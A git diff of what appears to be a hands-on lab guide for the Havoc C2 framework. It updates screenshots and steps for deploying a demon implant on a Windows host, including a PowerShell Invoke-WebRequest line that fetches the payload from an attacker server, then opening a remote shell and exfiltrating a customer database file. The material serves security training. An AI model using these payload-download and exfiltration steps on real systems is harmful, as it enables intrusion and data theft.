@@ -102,7 +102,7 @@ Once you have your AWS Account set up, let's get an **EC2 Instance** up and runn
    
  <img width="859" height="304" alt="image" src="https://github.com/user-attachments/assets/45364ac4-85e5-4305-8cda-b470c38a09c4" />
 
-   We will use the **VM's clipboard** to copy the .pem file.
+   We will use the **VM's clipboard** to copy the .pem file. Move the *.pem* file to the **lab directory (~/BnB/Havoc)**
  - To *open or close* the clipboard of the VM press **ctrl+alt+shift** and a small window will pop up: 
 
  <img width="526" height="826" alt="image" src="https://github.com/user-attachments/assets/9ce6ed1f-9a0a-4e46-80a0-39d65c95b40d" />
@@ -321,19 +321,30 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8000/demon.x64.exe" -OutFile "$env:TE
 
 - **Look back at your Ubuntu VM!** Within seconds, you should see a new active session pop up in the Havoc UI. The Windows machine has successfully "called home" to your AWS Teamserver.
 
-<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_SESIUNEA_ACTIVA_IN_HAVOC_UI_AICI]" />
+<img width="1852" height="669" alt="image" src="https://github.com/user-attachments/assets/570bf194-c444-42c5-b435-0921cad9aa4d" />
+
 
 - **Exfiltration:** Right-click the active session -> *Interact*. You now have a remote shell.
-- Use basic commands like `ls` and `cd` to navigate to `C:\Users\Administrator\Desktop\Labs\Havoc`.
+<img width="1146" height="387" alt="image" src="https://github.com/user-attachments/assets/406ab603-0ec0-4351-b7a7-f54d9970a759" />
+- Use basic commands like `ls` and `cd` to navigate to `C:\Users\Administrator\Desktop\Labs\Havoc`: 
+<img width="1480" height="669" alt="image" src="https://github.com/user-attachments/assets/00ade0b5-c5f9-4603-bc56-8178cf89aaf5" />
+
 - Type the following command to exfiltrate the database:
 
 ```bash
 download customer_database.csv
 ```
 
-<img width="1000" height="500" alt="image" src="[ADAUGA_SCREENSHOT_CU_DOWNLOAD_COMAND_IN_HAVOC_AICI]" />
+<img width="1314" height="672" alt="image" src="https://github.com/user-attachments/assets/4830a608-52da-4439-aced-d059e2f2c0ff" />
 
-Once downloaded, you can find the file in your Havoc Loot module (View -> Loot). **Attack successful!**
+
+Once downloaded, you can find the file in your Havoc Loot module (View -> Loot).
+
+<img width="1396" height="812" alt="image" src="https://github.com/user-attachments/assets/ce1efec8-ed65-4724-831e-07559c6909b0" />
+<br></br>
+<img width="1844" height="672" alt="image" src="https://github.com/user-attachments/assets/71186571-c72c-422c-872a-01fcffe067ae" />
+
+ **Attack successful!** >:D
 
 ---
 
